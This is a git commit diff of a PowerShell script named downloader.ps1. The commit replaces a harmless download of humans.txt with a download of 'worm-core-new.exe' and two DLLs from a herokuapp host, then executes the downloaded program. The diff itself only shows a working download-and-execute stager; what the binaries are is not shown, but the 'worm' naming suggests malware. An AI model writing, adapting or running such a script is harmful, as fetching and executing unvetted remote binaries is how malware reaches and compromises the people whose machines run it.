7eb25ab7e539baf3a6d143790995bac2659cc72e
epollans <48161388+epollans@users.noreply.github.com>
2020-06-02 03:03:57 -0700

    Update downloader.ps1

--- downloader.ps1
+++ downloader.ps1
@@ -3,13 +3,17 @@
 New-Item -Path 'C:\temp\Test' -ItemType Directory
 
 # create a new file 
-New-item C:\temp\Test\download.txt
+New-item C:\temp\Test\worm-core-new.exe
+New-item C:\temp\Test\worm-core.dll
+New-item C:\temp\Test\Newtonsoft.Json.dll
 
 # invoke the web request 
 
-Invoke-WebRequest http://humanstxt.org/humans.txt -Outfile C:\temp\Test\download.txt
+Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/worm-core-new.exe -Outfile C:\temp\Test\worm-core-new.exe
+Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/worm-core.dll -Outfile C:\temp\Test\worm-core.dll
+Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/Newtonsoft.Json.dll -Outfile C:\temp\Test\Newtonsoft.Json.dll
 
 # execute the file 
-Invoke-Item "C:\temp\test\download.txt"
+Invoke-Item "C:\temp\test\worm-core-new.exe"
 
 
